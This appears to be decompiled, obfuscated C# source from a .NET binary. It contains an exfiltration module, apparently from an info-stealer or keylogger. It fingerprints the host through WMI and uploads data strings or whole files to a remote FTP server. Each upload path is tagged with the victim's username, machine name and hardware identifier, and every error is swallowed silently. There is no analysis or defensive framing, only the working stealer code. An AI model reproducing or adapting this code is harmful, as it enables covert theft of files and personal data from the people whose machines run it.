using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wmzoZRdMaf;

internal sealed class OTEZtdtAZBqJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string wvJsjjHPPBP()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107404797));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107404776)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107404215);
			ManagementObject val3 = new ManagementObject(getString_0(107404210) + text2 + getString_0(107404201));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107404196)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107391593) : text;
		}
	}

	public static void UdMtkMlrAUaE(string gjZfMDJCAZJSA = "URL", string eizojuKWIAHWxf = "USERNAME", string URDDTxQnWtB = "ACCESO", string qBSJVGeLQW = "")
	{
		try
		{
			string text = wvJsjjHPPBP();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(gjZfMDJCAZJSA + getString_0(107405921) + Environment.UserName + getString_0(107405876) + Environment.MachineName + getString_0(107405887) + text + getString_0(107405850));
			ftpWebRequest.Method = getString_0(107404171);
			ftpWebRequest.Credentials = new NetworkCredential(eizojuKWIAHWxf, URDDTxQnWtB);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(qBSJVGeLQW);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void jhrZoqvdXpIRCMN(string choaSygiqgGhLE = "URL", string VIjWZizJANJrNrMW = "USERNAME", string MDopnEVZGlvV = "ACCESO", string UWiEPOtjoLR = "")
	{
		try
		{
			string text = wvJsjjHPPBP();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(choaSygiqgGhLE + getString_0(107405921) + Environment.UserName + getString_0(107405876) + Environment.MachineName + getString_0(107405887) + text + getString_0(107405887) + Path.GetFileName(UWiEPOtjoLR));
			ftpWebRequest.Method = getString_0(107404171);
			ftpWebRequest.Credentials = new NetworkCredential(VIjWZizJANJrNrMW, MDopnEVZGlvV);
			byte[] array = File.ReadAllBytes(UWiEPOtjoLR);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static OTEZtdtAZBqJ()
	{
		Strings.CreateGetStringDelegate(typeof(OTEZtdtAZBqJ));
	}
}
